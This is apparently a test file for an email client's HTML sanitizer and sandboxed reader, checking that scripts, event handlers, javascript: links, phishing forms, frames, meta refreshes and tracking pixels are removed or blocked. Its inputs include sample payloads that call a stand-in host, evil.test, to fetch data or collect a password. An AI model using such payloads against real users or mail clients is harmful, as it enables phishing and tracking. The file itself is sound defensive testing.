import { describe, expect, it } from 'vitest';
import { readerDocument, sanitizeBody } from '../sanitize';

/**
 * A message body is markup written by someone the Screener has not approved
 * yet, so these are the tests that have to hold. Each one is a thing a real
 * phishing or tracking email does.
 */
describe('sanitizeBody', () => {
  const clean = (html: string, images = true) => sanitizeBody(html, images).html;

  it('keeps the markup that makes a message worth rendering', () => {
    const out = clean('<table><tr><td><b>Total</b></td><td>€248.00</td></tr></table>');
    expect(out).toContain('<table>');
    expect(out).toContain('<b>Total</b>');
    expect(out).toContain('€248.00');
  });

  it('keeps the inline styling that HTML mail actually travels with', () => {
    // Gmail and Outlook have stripped <style> for years, so real mail inlines
    // everything. This is what "pretty" depends on surviving.
    const out = clean('<table bgcolor="#eee" width="600"><tr><td align="center" style="padding:12px;color:#111">X</td></tr></table>');
    expect(out).toContain('bgcolor="#eee"');
    expect(out).toContain('style="padding:12px;color:#111"');
  });

  /**
   * Not a hole — a division of labour, and worth pinning so nobody "fixes"
   * the sanitizer and assumes the CSP is then redundant. A CSS background is
   * a legitimate declaration; `img-src` is what stops it being fetched.
   */
  it('leaves a CSS background url for the CSP to deal with', () => {
    expect(clean('<p style="background:url(https://track.test/p.gif)">Hi</p>')).toContain(
      'track.test',
    );
    expect(readerDocument('', false)).toContain("default-src 'none'");
  });

  it('removes scripts', () => {
    const out = clean('<p>Hi</p><script>fetch("https://evil.test")</script>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('fetch(');
    expect(out).toContain('<p>Hi</p>');
  });

  it('removes event handlers', () => {
    const out = clean('<img src="data:," onerror="fetch(\'https://evil.test\')"><p onclick="x()">Hi</p>');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('onclick');
  });

  it('removes a javascript: link', () => {
    expect(clean('<a href="javascript:alert(1)">Click</a>')).not.toContain('javascript:');
  });

  it('removes forms, so a phishing field has nowhere to post', () => {
    const out = clean(
      '<form action="https://evil.test"><input name="password"><button>Sign in</button></form>',
    );
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
  });

  it('removes nested frames and objects', () => {
    const out = clean('<iframe src="https://evil.test"></iframe><object data="x.swf"></object>');
    expect(out).not.toContain('<iframe');
    expect(out).not.toContain('<object');
  });

  it('removes a meta refresh, which navigates with no click at all', () => {
    expect(clean('<meta http-equiv="refresh" content="0;url=https://evil.test">')).not.toContain(
      'http-equiv',
    );
  });

  it('opens links away from the reader rather than in place', () => {
    const out = clean('<a href="https://example.com/x">Read</a>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener noreferrer"');
  });
});

describe('blocking remote images', () => {
  it('defuses a tracking pixel and counts it', () => {
    const result = sanitizeBody('<img src="https://track.test/pixel.gif" width="1">', false);
    expect(result.blockedImages).toBe(1);
    // `data-blocked-src="` ends in `src="`, so match the real attribute.
    expect(result.html).not.toMatch(/(^|\s)src="https/);
    expect(result.html).toContain('data-blocked-src');
  });

  it('leaves an inline data: image alone — it fetches nothing', () => {
    const result = sanitizeBody('<img src="data:image/gif;base64,R0lGOD">', false);
    expect(result.blockedImages).toBe(0);
    expect(result.html).toContain('src="data:image/gif');
  });

  it('loads remote images once the sender is established', () => {
    const result = sanitizeBody('<img src="https://cdn.test/logo.png">', true);
    expect(result.blockedImages).toBe(0);
    expect(result.html).toContain('src="https://cdn.test/logo.png"');
  });

  it('does not carry one message’s image policy into the next', () => {
    // The hook is installed on a module-level singleton; leaving it attached
    // applied the blocked policy to every later message in the thread.
    sanitizeBody('<img src="https://track.test/a.gif">', false);
    const after = sanitizeBody('<img src="https://cdn.test/b.png">', true);
    expect(after.blockedImages).toBe(0);
    expect(after.html).toContain('src="https://cdn.test/b.png"');
  });
});

describe('the reader document', () => {
  it('forbids every kind of fetch except the images that are allowed', () => {
    const blocked = readerDocument('<p>Hi</p>', false);
    expect(blocked).toContain("default-src 'none'");
    expect(blocked).toContain('img-src data: cid:;');
    expect(blocked).not.toContain('img-src https:');

    const allowed = readerDocument('<p>Hi</p>', true);
    expect(allowed).toContain('img-src https: data: cid:;');
  });

  it('grants no script source at all, so nothing missed above can run', () => {
    expect(readerDocument('<p>Hi</p>', true)).not.toContain('script-src');
  });

  it('stops a message widening the reader whatever its own CSS says', () => {
    expect(readerDocument('<p>Hi</p>', true)).toContain('max-width: 100%');
  });
});
